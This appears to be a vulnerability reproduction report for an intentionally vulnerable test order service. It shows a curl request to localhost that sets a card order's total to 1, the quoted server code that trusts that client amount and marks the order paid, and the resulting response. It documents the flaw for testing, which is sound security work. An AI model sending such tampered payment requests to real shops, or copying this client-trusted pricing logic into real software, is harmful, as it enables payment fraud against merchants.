# V6: Payment amount manipulation

Baseline reference: baseline-vulnerable (`cb68a377f5b8cdc3b12f86883ac6fb703ef5e405`)
Primary mapping: CWE-841: Improper Enforcement of Behavioral Workflow

## Reproduction request

```bash
curl -i -X POST http://localhost:5000/api/orders \
  -H 'Content-Type: application/json' \
  --data '{"userId":"00000000-0000-4000-8000-000000000001","items":[{"productId":"0000000000000000000000d1","quantity":2}],"paymentMethod":"card","totalAmount":1,"currency":"usd","deliveryAddress":"Synthetic Address A","phoneNumber":"0700000001"}'
```

## Baseline source result

- PASS: order-service/src/controller/order.controller.js:48 contains `const finalAmount = paymentMethod === 'card' ? totalAmount : calculatedTotalAmount;`
- PASS: order-service/src/controller/order.controller.js:59 contains `status: paymentMethod === 'card' ? 'paid' : 'pending',`

Impact: The card-order path uses a client-selected amount and marks the order paid without server-side confirmation that the amount matches trusted product prices.

This Phase 3 artifact is a reproducible source-level baseline proof.

## Live baseline response

Run from the isolated baseline checkout without credentials. The product fixture price is 1250 per item and quantity is 2, so the trusted total would be 2500:

```text
HTTP/1.1 201 Created
Content-Type: application/json; charset=utf-8
{"message":"Order created successfully","order":{"userId":"00000000-0000-4000-8000-000000000001","totalAmount":1,"currency":"usd","paymentMethod":"card","status":"paid"}}
```

The baseline accepted the client amount of 1 and marked the card order paid. The complete response contained only synthetic fixture data.
